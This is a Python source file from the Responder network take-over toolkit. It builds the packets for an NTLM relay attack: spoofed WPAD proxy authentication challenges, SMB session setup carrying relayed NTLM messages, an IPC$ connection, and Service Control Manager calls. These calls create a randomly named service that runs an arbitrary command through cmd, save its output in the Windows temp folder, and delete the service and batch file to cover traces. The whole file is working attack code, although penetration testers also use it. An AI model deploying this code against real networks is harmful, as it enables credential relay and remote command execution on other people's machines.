#!/usr/bin/env python
# This file is part of Responder, a network take-over set of tools 
# created and maintained by Laurent Gaffie.
# email: laurent.gaffie@gmail.com
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import struct
import sys
import random
import time
from odict import OrderedDict
import datetime
from base64 import b64decode, b64encode

def longueur(payload):
    length = struct.pack(">i", len(''.join(payload)))
    return length

class Packet():
    fields = OrderedDict([
        ("data", ""),
    ])
    def __init__(self, **kw):
        self.fields = OrderedDict(self.__class__.fields)
        for k,v in kw.items():
            if callable(v):
                self.fields[k] = v(self.fields[k])
            else:
                self.fields[k] = v
    def __str__(self):
        return "".join(map(str, self.fields.values()))

##################HTTP Proxy Relay##########################
def HTTPCurrentDate():
    Date = datetime.datetime.utcnow().strftime('%a, %d %b %Y %H:%M:%S GMT')
    return Date

class WPAD_Auth_407_Ans(Packet):
	fields = OrderedDict([
		("Code",          "HTTP/1.1 407 Unauthorized\r\n"),
		("ServerType",    "Server: Microsoft-IIS/7.5\r\n"),
		("Date",          "Date: "+HTTPCurrentDate()+"\r\n"),
		("Type",          "Content-Type: text/html\r\n"),
		("WWW-Auth",      "Proxy-Authenticate: NTLM\r\n"),
		("Connection",    "Proxy-Connection: close\r\n"),
		("Cache-Control",    "Cache-Control: no-cache\r\n"),
		("Pragma",        "Pragma: no-cache\r\n"),
		("Proxy-Support", "Proxy-Support: Session-Based-Authentication\r\n"),
		("Len",           "Content-Length: 0\r\n"),
		("CRLF",          "\r\n"),
	])


class WPAD_NTLM_Challenge_Ans(Packet):
	fields = OrderedDict([
		("Code",          "HTTP/1.1 407 Unauthorized\r\n"),
		("ServerType",    "Server: Microsoft-IIS/7.5\r\n"),
		("Date",          "Date: "+HTTPCurrentDate()+"\r\n"),
		("Type",          "Content-Type: text/html\r\n"),
		("WWWAuth",       "Proxy-Authenticate: NTLM "),
		("Payload",       ""),
		("Payload-CRLF",  "\r\n"),
		("Len",           "Content-Length: 0\r\n"),
		("CRLF",          "\r\n"),
	])

	def calculate(self,payload):
		self.fields["Payload"] = b64encode(payload)

##################SMB Relay Packet##########################
class SMBHeader(Packet):
    fields = OrderedDict([
        ("proto", "\xff\x53\x4d\x42"),
        ("cmd", "\x72"),
        ("error-code", "\x00\x00\x00\x00" ),
        ("flag1", "\x08"),
        ("flag2", "\x01\xc8"),
        ("pidhigh", "\x00\x00"),
        ("signature", "\x00\x00\x00\x00\x00\x00\x00\x00"),
        ("Reserved", "\x00\x00"),
        ("tid", "\x00\x00"),
        ("pid", "\x3c\x1b"),
        ("uid", "\x00\x00"),
        ("mid", "\x00\x00"),
    ])

class SMBNegoCairo(Packet):
    fields = OrderedDict([
        ("Wordcount", "\x00"),
        ("Bcc", "\x62\x00"),
        ("Data", "")
    ])
    
    def calculate(self):
        self.fields["Bcc"] = struct.pack("<H",len(str(self.fields["Data"])))

class SMBNegoCairoData(Packet):
    fields = OrderedDict([
        ("Separator1","\x02" ),
        ("Dialect1", "Cairo 0.xa\x00"), #Let's talk Cairo!
    ])

class SMBSessionSetupAndxNEGO(Packet):
    fields = OrderedDict([
        ("Wordcount", "\x0c"),
        ("AndXCommand", "\xff"),
        ("Reserved","\x00" ),
        ("AndXOffset", "\xec\x00"),              
        ("MaxBuff","\xff\xff"),
        ("MaxMPX", "\x32\x00"),
        ("VCNumber","\x00\x00"),
        ("SessionKey", "\x00\x00\x00\x00"),
        ("SecBlobLen","\x4a\x00"),
        ("Reserved2","\x00\x00\x00\x00"),
        ("Capabilities", "\xfc\xe3\x01\x80"), 
        ("Bcc","\xb1\x00"),
        ##gss api starts here.
        ("ApplicationHeaderTag","\x60"),
        ("ApplicationHeaderLen","\x48"),
        ("AsnSecMechType","\x06"),
        ("AsnSecMechLen","\x06"),
        ("AsnSecMechStr","\x2b\x06\x01\x05\x05\x02"),
        ("ChoosedTag","\xa0"),
        ("ChoosedTagStrLen","\x3e"),
        ("NegTokenInitSeqHeadTag","\x30"),
        ("NegTokenInitSeqHeadLen","\x3c"),
        ("NegTokenInitSeqHeadTag1","\xA0"),
        ("NegTokenInitSeqHeadLen1","\x0e"),
        ("NegTokenInitSeqNLMPTag","\x30"),
        ("NegTokenInitSeqNLMPLen","\x0c"),
        ("NegTokenInitSeqNLMPTag1","\x06"),
        ("NegTokenInitSeqNLMPTag1Len","\x0a"),
        ("NegTokenInitSeqNLMPTag1Str","\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a"),
        ("NegTokenInitSeqNLMPTag2","\xa2"),
        ("NegTokenInitSeqNLMPTag2Len","\x2a"),
        ("NegTokenInitSeqNLMPTag2Octet","\x04"),
        ("NegTokenInitSeqNLMPTag2OctetLen","\x28"),
        ## NTLM packet ##
        ("Data",                           ""),
        ## NTLM packet ##
        ("NegTokenInitSeqMechMessageVersionTerminator","\x00"),
        ("NativeOs","Windows 2002 Service Pack 3 2600"),
        ("NativeOsTerminator","\x00\x00"),
        ("NativeLan","Windows 2002 5.1"),
        ("NativeLanTerminator","\x00\x00\x00\x00"),

    ])
    def calculate(self): 

        self.fields["NativeOs"] = self.fields["NativeOs"].encode('utf-16le')
        self.fields["NativeLan"] = self.fields["NativeLan"].encode('utf-16le')

        CompleteSMBPacketLen = str(self.fields["Wordcount"])+str(self.fields["AndXCommand"])+str(self.fields["Reserved"])+str(self.fields["AndXOffset"])+str(self.fields["MaxBuff"])+str(self.fields["MaxMPX"])+str(self.fields["VCNumber"])+str(self.fields["SessionKey"])+str(self.fields["SecBlobLen"])+str(self.fields["Reserved2"])+str(self.fields["Capabilities"])+str(self.fields["Bcc"])+str(self.fields["ApplicationHeaderTag"])+str(self.fields["ApplicationHeaderLen"])+str(self.fields["AsnSecMechType"])+str(self.fields["AsnSecMechLen"])+str(self.fields["AsnSecMechStr"])+str(self.fields["ChoosedTag"])+str(self.fields["ChoosedTagStrLen"])+str(self.fields["NegTokenInitSeqHeadTag"])+str(self.fields["NegTokenInitSeqHeadLen"])+str(self.fields["NegTokenInitSeqHeadTag1"])+str(self.fields["NegTokenInitSeqHeadLen1"])+str(self.fields["NegTokenInitSeqNLMPTag"])+str(self.fields["NegTokenInitSeqNLMPLen"])+str(self.fields["NegTokenInitSeqNLMPTag1"])+str(self.fields["NegTokenInitSeqNLMPTag1Len"])+str(self.fields["NegTokenInitSeqNLMPTag1Str"])+str(self.fields["NegTokenInitSeqNLMPTag2"])+str(self.fields["NegTokenInitSeqNLMPTag2Len"])+str(self.fields["NegTokenInitSeqNLMPTag2Octet"])+str(self.fields["NegTokenInitSeqNLMPTag2OctetLen"])+str(self.fields["Data"])+str(self.fields["NegTokenInitSeqMechMessageVersionTerminator"])+str(self.fields["NativeOs"])+str(self.fields["NativeOsTerminator"])+str(self.fields["NativeLan"])+str(self.fields["NativeLanTerminator"])


        SecBlobLen = str(self.fields["ApplicationHeaderTag"])+str(self.fields["ApplicationHeaderLen"])+str(self.fields["AsnSecMechType"])+str(self.fields["AsnSecMechLen"])+str(self.fields["AsnSecMechStr"])+str(self.fields["ChoosedTag"])+str(self.fields["ChoosedTagStrLen"])+str(self.fields["NegTokenInitSeqHeadTag"])+str(self.fields["NegTokenInitSeqHeadLen"])+str(self.fields["NegTokenInitSeqHeadTag1"])+str(self.fields["NegTokenInitSeqHeadLen1"])+str(self.fields["NegTokenInitSeqNLMPTag"])+str(self.fields["NegTokenInitSeqNLMPLen"])+str(self.fields["NegTokenInitSeqNLMPTag1"])+str(self.fields["NegTokenInitSeqNLMPTag1Len"])+str(self.fields["NegTokenInitSeqNLMPTag1Str"])+str(self.fields["NegTokenInitSeqNLMPTag2"])+str(self.fields["NegTokenInitSeqNLMPTag2Len"])+str(self.fields["NegTokenInitSeqNLMPTag2Octet"])+str(self.fields["NegTokenInitSeqNLMPTag2OctetLen"])+str(self.fields["Data"])


        data3 = str(self.fields["NegTokenInitSeqHeadTag"])+str(self.fields["NegTokenInitSeqHeadLen"])+str(self.fields["NegTokenInitSeqHeadTag1"])+str(self.fields["NegTokenInitSeqHeadLen1"])+str(self.fields["NegTokenInitSeqNLMPTag"])+str(self.fields["NegTokenInitSeqNLMPLen"])+str(self.fields["NegTokenInitSeqNLMPTag1"])+str(self.fields["NegTokenInitSeqNLMPTag1Len"])+str(self.fields["NegTokenInitSeqNLMPTag1Str"])+str(self.fields["NegTokenInitSeqNLMPTag2"])+str(self.fields["NegTokenInitSeqNLMPTag2Len"])+str(self.fields["NegTokenInitSeqNLMPTag2Octet"])+str(self.fields["NegTokenInitSeqNLMPTag2OctetLen"])+str(self.fields["Data"])

        data4 = str(self.fields["NegTokenInitSeqHeadTag1"])+str(self.fields["NegTokenInitSeqHeadLen1"])+str(self.fields["NegTokenInitSeqNLMPTag"])+str(self.fields["NegTokenInitSeqNLMPLen"])+str(self.fields["NegTokenInitSeqNLMPTag1"])+str(self.fields["NegTokenInitSeqNLMPTag1Len"])+str(self.fields["NegTokenInitSeqNLMPTag1Str"])+str(self.fields["NegTokenInitSeqNLMPTag2"])+str(self.fields["NegTokenInitSeqNLMPTag2Len"])+str(self.fields["NegTokenInitSeqNLMPTag2Octet"])+str(self.fields["NegTokenInitSeqNLMPTag2OctetLen"])+str(self.fields["Data"])

        data5 = str(self.fields["ApplicationHeaderTag"])+str(self.fields["ApplicationHeaderLen"])+str(self.fields["AsnSecMechType"])+str(self.fields["AsnSecMechLen"])+str(self.fields["AsnSecMechStr"])+str(self.fields["ChoosedTag"])+str(self.fields["ChoosedTagStrLen"])+str(self.fields["NegTokenInitSeqHeadTag"])+str(self.fields["NegTokenInitSeqHeadLen"])+str(self.fields["NegTokenInitSeqHeadTag1"])+str(self.fields["NegTokenInitSeqHeadLen1"])+str(self.fields["NegTokenInitSeqNLMPTag"])+str(self.fields["NegTokenInitSeqNLMPLen"])+str(self.fields["NegTokenInitSeqNLMPTag1"])+str(self.fields["NegTokenInitSeqNLMPTag1Len"])+str(self.fields["NegTokenInitSeqNLMPTag1Str"])+str(self.fields["NegTokenInitSeqNLMPTag2"])+str(self.fields["NegTokenInitSeqNLMPTag2Len"])+str(self.fields["NegTokenInitSeqNLMPTag2Octet"])+str(self.fields["NegTokenInitSeqNLMPTag2OctetLen"])+str(self.fields["Data"])+str(self.fields["NegTokenInitSeqMechMessageVersionTerminator"])+str(self.fields["NativeOs"])+str(self.fields["NativeOsTerminator"])+str(self.fields["NativeLan"])+str(self.fields["NativeLanTerminator"])

        data6 = str(self.fields["NegTokenInitSeqNLMPTag2Octet"])+str(self.fields["NegTokenInitSeqNLMPTag2OctetLen"])+str(self.fields["Data"])

        data10 = str(self.fields["NegTokenInitSeqNLMPTag"])+str(self.fields["NegTokenInitSeqNLMPLen"])+str(self.fields["NegTokenInitSeqNLMPTag1"])+str(self.fields["NegTokenInitSeqNLMPTag1Len"])+str(self.fields["NegTokenInitSeqNLMPTag1Str"])
       
        data11 = str(self.fields["NegTokenInitSeqNLMPTag1"])+str(self.fields["NegTokenInitSeqNLMPTag1Len"])+str(self.fields["NegTokenInitSeqNLMPTag1Str"])


        ## Packet len
        self.fields["AndXOffset"] = struct.pack("<h", len(CompleteSMBPacketLen)+32)
        ##Buff Len
        self.fields["SecBlobLen"] = struct.pack("<h", len(SecBlobLen))
        ##Complete Buff Len
        self.fields["Bcc"] = struct.pack("<h", len(CompleteSMBPacketLen)-27)#session setup struct is 27.
        ##App Header
        self.fields["ApplicationHeaderLen"] = struct.pack("<B", len(SecBlobLen)-2)
        ##Asn Field 1
        self.fields["AsnSecMechLen"] = struct.pack("<B", len(str(self.fields["AsnSecMechStr"])))
        ##Asn Field 1
        self.fields["ChoosedTagStrLen"] = struct.pack("<B", len(data3))
        ##SpNegoTokenLen
        self.fields["NegTokenInitSeqHeadLen"] = struct.pack("<B", len(data4))
        ##NegoTokenInit
        self.fields["NegTokenInitSeqHeadLen1"] = struct.pack("<B", len(data10)) 
        ## Tag0 Len
        self.fields["NegTokenInitSeqNLMPLen"] = struct.pack("<B", len(data11))
        ## Tag0 Str Len
        self.fields["NegTokenInitSeqNLMPTag1Len"] = struct.pack("<B", len(str(self.fields["NegTokenInitSeqNLMPTag1Str"])))
        ## Tag2 Len
        self.fields["NegTokenInitSeqNLMPTag2Len"] = struct.pack("<B", len(data6))
        ## Tag3 Len
        self.fields["NegTokenInitSeqNLMPTag2OctetLen"] = struct.pack("<B", len(str(self.fields["Data"])))


class SMBSessionSetupAndxAUTH(Packet):
    fields = OrderedDict([
        ("wordcount", "\x0c"),
        ("AndXCommand", "\xff"),
        ("reserved","\x00" ),
        ("andxoffset", "\xfa\x00"),
        ("maxbuff","\xff\xff"),
        ("maxmpx", "\x32\x00"),
        ("vcnum","\x01\x00"),
        ("sessionkey", "\x00\x00\x00\x00"),
        ("securitybloblength","\x59\x00"),
        ("reserved2","\x00\x00\x00\x00"),
        ("capabilities", "\xfc\xe3\x01\x80"),
        ("bcc1","\xbf\x00"), 
        ("ApplicationHeaderTag","\xa1"),
        ("ApplicationHeaderTagLenOfLen","\x81"),
        ("ApplicationHeaderLen","\xd1"),
        ("AsnSecMechType","\x30"),
        ("AsnSecMechLenOfLen","\x81"),
        ("AsnSecMechLen","\xce"),
        ("ChoosedTag","\xa2"),
        ("ChoosedTagLenOfLen","\x81"),
        ("ChoosedTagLen","\xcb"),
        ("ChoosedTag1","\x04"),
        ("ChoosedTag1StrLenOfLen","\x81"),
        ("ChoosedTag1StrLen","\xc8"),
        #### NTLM Packet ####
        ("Data",  ""),
        #### End Of SMB ####
        ("NLMPAuthMsgNull","\x00"),
        ("NativeOs","Unix"),
        ("NativeOsTerminator","\x00\x00"),
        ("ExtraNull",""),
        ("NativeLan","Samba"),
        ("NativeLanTerminator","\x00\x00"),
        ("AndxPadding",""),
        ])


    def calculate(self): 
        self.fields["NativeOs"] = self.fields["NativeOs"].encode('utf-16le')
        self.fields["NativeLan"] = self.fields["NativeLan"].encode('utf-16le')

        SecurityBlobLen = str(self.fields["ApplicationHeaderTag"])+str(self.fields["ApplicationHeaderTagLenOfLen"])+str(self.fields["ApplicationHeaderLen"])+str(self.fields["AsnSecMechType"])+str(self.fields["AsnSecMechLenOfLen"])+str(self.fields["AsnSecMechLen"])+str(self.fields["ChoosedTag"])+str(self.fields["ChoosedTagLenOfLen"])+str(self.fields["ChoosedTagLen"])+str(self.fields["ChoosedTag1"])+str(self.fields["ChoosedTag1StrLenOfLen"])+str(self.fields["ChoosedTag1StrLen"])+str(self.fields["Data"])

        NTLMData = str(self.fields["Data"])
	###### ASN Stuff
        if len(NTLMData) > 255:
	   self.fields["ApplicationHeaderTagLenOfLen"] = "\x82"
	   self.fields["ApplicationHeaderLen"] = struct.pack(">H", len(SecurityBlobLen)-0)
        else:
           self.fields["ApplicationHeaderTagLenOfLen"] = "\x81"
	   self.fields["ApplicationHeaderLen"] = struct.pack(">B", len(SecurityBlobLen)-3)

        if len(NTLMData)-8 > 255:
           self.fields["AsnSecMechLenOfLen"] = "\x82"
	   self.fields["AsnSecMechLen"] = struct.pack(">H", len(SecurityBlobLen)-4)
        else:
           self.fields["AsnSecMechLenOfLen"] = "\x81"
	   self.fields["AsnSecMechLen"] = struct.pack(">B", len(SecurityBlobLen)-6)

        if len(NTLMData)-12 > 255:
           self.fields["ChoosedTagLenOfLen"] = "\x82"
           self.fields["ChoosedTagLen"] = struct.pack(">H", len(SecurityBlobLen)-8) 
        else:
           self.fields["ChoosedTagLenOfLen"] = "\x81"
           self.fields["ChoosedTagLen"] = struct.pack(">B", len(SecurityBlobLen)-9)

        if len(NTLMData)-16 > 255:
           self.fields["ChoosedTag1StrLenOfLen"] = "\x82"
           self.fields["ChoosedTag1StrLen"] = struct.pack(">H", len(SecurityBlobLen)-12)
        else:
           self.fields["ChoosedTag1StrLenOfLen"] = "\x81"
           self.fields["ChoosedTag1StrLen"] = struct.pack(">B", len(SecurityBlobLen)-12)

        CompletePacketLen = str(self.fields["wordcount"])+str(self.fields["AndXCommand"])+str(self.fields["reserved"])+str(self.fields["andxoffset"])+str(self.fields["maxbuff"])+str(self.fields["maxmpx"])+str(self.fields["vcnum"])+str(self.fields["sessionkey"])+str(self.fields["securitybloblength"])+str(self.fields["reserved2"])+str(self.fields["capabilities"])+str(self.fields["bcc1"])+str(self.fields["ApplicationHeaderTag"])+str(self.fields["ApplicationHeaderTagLenOfLen"])+str(self.fields["ApplicationHeaderLen"])+str(self.fields["AsnSecMechType"])+str(self.fields["AsnSecMechLenOfLen"])+str(self.fields["AsnSecMechLen"])+str(self.fields["ChoosedTag"])+str(self.fields["ChoosedTagLenOfLen"])+str(self.fields["ChoosedTagLen"])+str(self.fields["ChoosedTag1"])+str(self.fields["ChoosedTag1StrLenOfLen"])+str(self.fields["ChoosedTag1StrLen"])+str(self.fields["Data"])+str(self.fields["NLMPAuthMsgNull"])+str(self.fields["NativeOs"])+str(self.fields["NativeOsTerminator"])+str(self.fields["ExtraNull"])+str(self.fields["NativeLan"])+str(self.fields["NativeLanTerminator"])

        SecurityBlobLenUpdated = str(self.fields["ApplicationHeaderTag"])+str(self.fields["ApplicationHeaderTagLenOfLen"])+str(self.fields["ApplicationHeaderLen"])+str(self.fields["AsnSecMechType"])+str(self.fields["AsnSecMechLenOfLen"])+str(self.fields["AsnSecMechLen"])+str(self.fields["ChoosedTag"])+str(self.fields["ChoosedTagLenOfLen"])+str(self.fields["ChoosedTagLen"])+str(self.fields["ChoosedTag1"])+str(self.fields["ChoosedTag1StrLenOfLen"])+str(self.fields["ChoosedTag1StrLen"])+str(self.fields["Data"])

        ## Packet len
        self.fields["andxoffset"] = struct.pack("<h", len(CompletePacketLen)+32) #SMB1 Header is always 32
        ##Buff Len
        self.fields["securitybloblength"] = struct.pack("<h", len(SecurityBlobLenUpdated))
        ##Complete Buff Len
        self.fields["bcc1"] = struct.pack("<h", len(CompletePacketLen)-27) #SessionSetup struct is 27.

class SMBTreeConnectData(Packet):
    fields = OrderedDict([
        ("Wordcount", "\x04"),
        ("AndXCommand", "\xff"),
        ("Reserved","\x00" ),
        ("Andxoffset", "\x5a\x00"), 
        ("Flags","\x08\x00"),
        ("PasswdLen", "\x01\x00"),
        ("Bcc","\x2f\x00"),
        ("Passwd", "\x00"),
        ("Path","\\\\IPC$"),
        ("PathTerminator","\x00\x00"),
        ("Service","?????"),
        ("Terminator", "\x00"),

    ])
    def calculate(self): 
         
        ##Convert Path to Unicode first before any Len calc.
        self.fields["Path"] = self.fields["Path"].encode('utf-16le')

        ##Passwd Len
        self.fields["PasswdLen"] = struct.pack("<i", len(str(self.fields["Passwd"])))[:2]

        ##Packet len
        CompletePacket = str(self.fields["Wordcount"])+str(self.fields["AndXCommand"])+str(self.fields["Reserved"])+str(self.fields["Andxoffset"])+str(self.fields["Flags"])+str(self.fields["PasswdLen"])+str(self.fields["Bcc"])+str(self.fields["Passwd"])+str(self.fields["Path"])+str(self.fields["PathTerminator"])+str(self.fields["Service"])+str(self.fields["Terminator"])

        self.fields["Andxoffset"] = struct.pack("<i", len(CompletePacket)+32)[:2]

        ##Bcc Buff Len
        BccComplete    = str(self.fields["Passwd"])+str(self.fields["Path"])+str(self.fields["PathTerminator"])+str(self.fields["Service"])+str(self.fields["Terminator"])
        self.fields["Bcc"] = struct.pack("<i", len(BccComplete))[:2]

class SMBNTCreateData(Packet):
    fields = OrderedDict([
        ("Wordcount",     "\x18"),
        ("AndXCommand",   "\xff"),
        ("Reserved",      "\x00" ),
        ("Andxoffset",    "\x00\x00"),
        ("Reserved2",     "\x00"),
        ("FileNameLen",   "\x07\x00"),
        ("CreateFlags",   "\x16\x00\x00\x00"),
        ("RootFID",       "\x00\x00\x00\x00"),
        ("AccessMask",    "\x00\x00\x00\x02"),
        ("AllocSize",     "\x00\x00\x00\x00\x00\x00\x00\x00"),
        ("FileAttrib",    "\x00\x00\x00\x00"),
        ("ShareAccess",   "\x07\x00\x00\x00"),
        ("Disposition",   "\x01\x00\x00\x00"),   
        ("CreateOptions", "\x00\x00\x00\x00"),
        ("Impersonation", "\x02\x00\x00\x00"),
        ("SecurityFlags", "\x00"),
        ("Bcc",           "\x08\x00"),
        ("FileName",      "\\svcctl"),
        ("FileNameNull",  "\x00"),
    ])

    def calculate(self):

        Data1= str(self.fields["FileName"])+str(self.fields["FileNameNull"])
        self.fields["FileNameLen"] = struct.pack("<h",len(str(self.fields["FileName"])))
        self.fields["Bcc"] = struct.pack("<h",len(Data1))

class SMBReadData(Packet):
    fields = OrderedDict([
        ("Wordcount",     "\x0a"),
        ("AndXCommand",   "\xff"),
        ("Reserved",      "\x00" ),
        ("Andxoffset",    "\x00\x00"),
        ("FID",           "\x00\x00"),
        ("Offset",        "\x19\x03\x00\x00"), 
        ("MaxCountLow",   "\xed\x01"),
        ("MinCount",      "\xed\x01"),
        ("Hidden",        "\xff\xff\xff\xff"),
        ("Remaining",     "\x00\x00"),  
        ("Bcc",           "\x00\x00"),
        ("Data", ""),
    ])

    def calculate(self):

        self.fields["Bcc"] = struct.pack("<h",len(str(self.fields["Data"])))

class SMBWriteData(Packet):
    fields = OrderedDict([
        ("Wordcount",     "\x0e"),
        ("AndXCommand",   "\xff"),
        ("Reserved",      "\x00" ),
        ("Andxoffset",    "\x00\x00"),
        ("FID",           "\x06\x40"),
        ("Offset",        "\xea\x03\x00\x00"),
        ("Reserved2",     "\xff\xff\xff\xff"),
        ("WriteMode",     "\x08\x00"),
        ("Remaining",     "\xdc\x02"),
        ("DataLenHi",     "\x00\x00"),
        ("DataLenLow",    "\xdc\x02"),
        ("DataOffset",    "\x3f\x00"),
        ("HiOffset",      "\x00\x00\x00\x00"),   
        ("Bcc",           "\xdc\x02"),
        ("Data", ""),
    ])

    def calculate(self):
        self.fields["Remaining"] = struct.pack("<h",len(str(self.fields["Data"])))
        self.fields["DataLenLow"] = struct.pack("<h",len(str(self.fields["Data"])))
        self.fields["Bcc"] = struct.pack("<h",len(str(self.fields["Data"])))

class SMBDCEData(Packet):
    fields = OrderedDict([
        ("Version",       "\x05"),
        ("VersionLow",    "\x00"),
        ("PacketType",    "\x0b"),
        ("PacketFlag",    "\x03"),
        ("DataRepresent", "\x10\x00\x00\x00"),
        ("FragLen",       "\x2c\x02"),
        ("AuthLen",       "\x00\x00"),
        ("CallID",        "\x00\x00\x00\x00"),
        ("MaxTransFrag",  "\xd0\x16"),
        ("MaxRecvFrag",   "\xd0\x16"),
        ("GroupAssoc",    "\x00\x00\x00\x00"),
        ("CTXNumber",     "\x01"),
        ("CTXPadding",    "\x00\x00\x00"),
        ("CTX0ContextID",  "\x00\x00"),
        ("CTX0ItemNumber", "\x01\x00"),
        ("CTX0UID", "\x81\xbb\x7a\x36\x44\x98\xf1\x35\xad\x32\x98\xf0\x38\x00\x10\x03"),
        ("CTX0UIDVersion", "\x02\x00"),
        ("CTX0UIDVersionlo","\x00\x00"),
        ("CTX0UIDSyntax",   "\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00\x2b\x10\x48\x60"),
        ("CTX0UIDSyntaxVer","\x02\x00\x00\x00"),
    ])

    def calculate(self):

        Data1= str(self.fields["Version"])+str(self.fields["VersionLow"])+str(self.fields["PacketType"])+str(self.fields["PacketFlag"])+str(self.fields["DataRepresent"])+str(self.fields["FragLen"])+str(self.fields["AuthLen"])+str(self.fields["CallID"])+str(self.fields["MaxTransFrag"])+str(self.fields["MaxRecvFrag"])+str(self.fields["GroupAssoc"])+str(self.fields["CTXNumber"])+str(self.fields["CTXPadding"])+str(self.fields["CTX0ContextID"])+str(self.fields["CTX0ItemNumber"])+str(self.fields["CTX0UID"])+str(self.fields["CTX0UIDVersion"])+str(self.fields["CTX0UIDVersionlo"])+str(self.fields["CTX0UIDSyntax"])+str(self.fields["CTX0UIDSyntaxVer"])


        self.fields["FragLen"] = struct.pack("<h",len(Data1))

class SMBDCEPacketData(Packet):
    fields = OrderedDict([
        ("Version",       "\x05"),
        ("VersionLow",    "\x00"),
        ("PacketType",    "\x00"),
        ("PacketFlag",    "\x03"),
        ("DataRepresent", "\x10\x00\x00\x00"),
        ("FragLen",       "\x2c\x02"),
        ("AuthLen",       "\x00\x00"),
        ("CallID",        "\x00\x00\x00\x00"),
        ("AllocHint",     "\x38\x00\x00\x00"),
        ("ContextID",     "\x00\x00"),
        ("Opnum",         "\x0f\x00"),
        ("Data",          ""),

    ])

    def calculate(self):

        Data1= str(self.fields["Version"])+str(self.fields["VersionLow"])+str(self.fields["PacketType"])+str(self.fields["PacketFlag"])+str(self.fields["DataRepresent"])+str(self.fields["FragLen"])+str(self.fields["AuthLen"])+str(self.fields["CallID"])+str(self.fields["AllocHint"])+str(self.fields["ContextID"])+str(self.fields["Opnum"])+str(self.fields["Data"])

        self.fields["FragLen"] = struct.pack("<h",len(Data1))
        self.fields["AllocHint"] = struct.pack("<i",len(str(self.fields["Data"])))

class SMBDCESVCCTLOpenManagerW(Packet):
    fields = OrderedDict([
        ("MachineNameRefID",     "\xb5\x97\xb9\xbc"),
        ("MaxCount",             "\x0f\x00\x00\x00"),
        ("Offset",               "\x00\x00\x00\x00"),
        ("ActualCount",          "\x0f\x00\x00\x00"),
        ("MachineName",          "\\\\169.220.1.11"),##This is not taken into consideration.
        ("MachineNameNull",      "\x00\x00\x00\x00"),
        ("DbPointer",            "\x00\x00\x00\x00"),
        ("AccessMask",           "\x3f\x00\x0f\x00"),
    ])

    def calculate(self):
        ## Convert to UTF-16LE
        self.fields["MachineName"] = self.fields["MachineName"].encode('utf-16le')

class SMBDCESVCCTLCreateService(Packet):
    fields = OrderedDict([
        ("ContextHandle",        ""),
        ("MaxCount",             "\x0c\x00\x00\x00"),
        ("Offset",               "\x00\x00\x00\x00"),
        ("ActualCount",          "\x0c\x00\x00\x00"),
        ("ServiceName",          "AyAGaxwLhCP"),
        ("MachineNameNull",      "\x00\x00"),
        ("ReferentID",           "\x9c\xfa\x9a\xc9"),
        ("MaxCountRefID",        "\x11\x00\x00\x00"),
        ("OffsetID",             "\x00\x00\x00\x00"),
        ("ActualCountRefID",     "\x11\x00\x00\x00"),
        ("DisplayNameID",        "DhhUFcsvrfJvLwRq"),
        ("DisplayNameIDNull",    "\x00\x00\x00\x00"),
        ("AccessMask",           "\xff\x01\x0f\x00"),
        ("ServerType",           "\x10\x01\x00\x00"),
        ("ServiceStartType",     "\x03\x00\x00\x00"),
        ("ServiceErrorCtl",      "\x00\x00\x00\x00"),
        ("BinPathMaxCount",      "\xb6\x00\x00\x00"),
        ("BinPathOffset",        "\x00\x00\x00\x00"),
        ("BinPathActualCount",   "\xb6\x00\x00\x00"),
        ("FileName",             ""),
        ("BinPathName",          ""),
        ("BinCMD",               ""),
        ("BintoEnd",             ""),
        ("BinPathNameNull",      "\x00\x00"),
        ("Nullz",                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"),
    ])

    def calculate(self):
        self.fields["BinCMD"] = self.fields["BinCMD"].replace("&", "^&")#Filtering
        self.fields["BinCMD"] = self.fields["BinCMD"].replace("(", "^(")#Filtering
        self.fields["BinCMD"] = self.fields["BinCMD"].replace(")", "^)")#Filtering
        self.fields["BinCMD"] = self.fields["BinCMD"].replace("%", "^%")#Filtering
        self.fields["BinCMD"] = self.fields["BinCMD"].replace(">", "^>")#Filtering
        self.fields["BinCMD"] = self.fields["BinCMD"].replace(">", "^>")#Filtering
        self.fields["BinCMD"] = self.fields["BinCMD"].replace("|", "^|")#Filtering
        self.fields["BinCMD"] = self.fields["BinCMD"].replace(",", "^,")#Filtering
        self.fields["BinCMD"] = self.fields["BinCMD"].replace("$", "^$")#Filtering
        self.fields["BinCMD"] = self.fields["BinCMD"].replace("!", "^!")#Filtering
        self.fields["BinCMD"] = self.fields["BinCMD"].replace(",", "^,")#Filtering
        self.fields["BinCMD"] = self.fields["BinCMD"].replace("'", "^'")#Filtering
        self.fields["BinCMD"] = self.fields["BinCMD"].replace("\"", "^\"")#Filtering

        File = "%WINDIR%\\Temp\\"+self.fields["FileName"]
        WinTmpPath = "%WINDIR%\\Temp\\Results.txt"
        CleanService = "sc delete "+self.fields["ServiceName"]+"^&"#Start by deleting the service..then run the cmd.
        FinalCMD = CleanService+"del /F /Q "+File+"^&"+self.fields["BinCMD"]+" ^>"+WinTmpPath+" >"+File
        #That is: delete service we just ran, delete the bat file (it's loaded in memory, no pb), echo original cmd into random .bat file, run .bat file.
        self.fields["FileName"] = ""#Reset it.
        self.fields["BinPathName"] = "%COMSPEC% /C echo "#make sure to escape "&" when using echo.
        self.fields["BinCMD"] = FinalCMD
        self.fields["BintoEnd"] = "& %COMSPEC% /C "+File
        BinDataLen = str(self.fields["BinPathName"])+str(self.fields["BinCMD"])+str(self.fields["BintoEnd"])

        ## Calculate first
        self.fields["BinPathMaxCount"] = struct.pack("<i",len(BinDataLen)+1)
        self.fields["BinPathActualCount"] = struct.pack("<i",len(BinDataLen)+1)
        self.fields["MaxCount"] = struct.pack("<i",len(str(self.fields["ServiceName"]))+1)
        self.fields["ActualCount"] = struct.pack("<i",len(str(self.fields["ServiceName"]))+1)
        self.fields["MaxCountRefID"] = struct.pack("<i",len(str(self.fields["DisplayNameID"]))+1)
        self.fields["ActualCountRefID"] = struct.pack("<i",len(str(self.fields["DisplayNameID"]))+1)
